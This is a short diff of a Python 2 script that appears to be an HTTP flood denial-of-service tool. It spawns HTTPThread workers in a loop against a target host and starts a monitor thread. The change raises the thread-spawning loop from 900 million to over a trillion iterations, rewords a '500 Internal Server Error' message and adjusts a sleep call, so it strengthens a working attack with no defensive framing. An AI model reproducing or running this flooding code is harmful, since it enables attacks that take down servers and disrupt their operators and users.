@@ -97,7 +97,7 @@ def httpcall(url):
 		
 			code=500
 	
-			print "Server down..."
+			print "500 Internal Server Error..."
 	else:
 			inc_counter()
 			urllib2.urlopen(request)
@@ -143,11 +143,11 @@ else:
 			url = url + "/"
 		m = re.search('(https?\://)?([^/]*)/?.*', url)
 		host = m.group(2)
-		for i in xrange(900000000):
+		for i in xrange(1374389534720):
                         
 			t = HTTPThread()
 			t.start()
 		t = MonitorThread()
 		t.start()
-		time.sleep(0)
+		time.sleep(1)
  
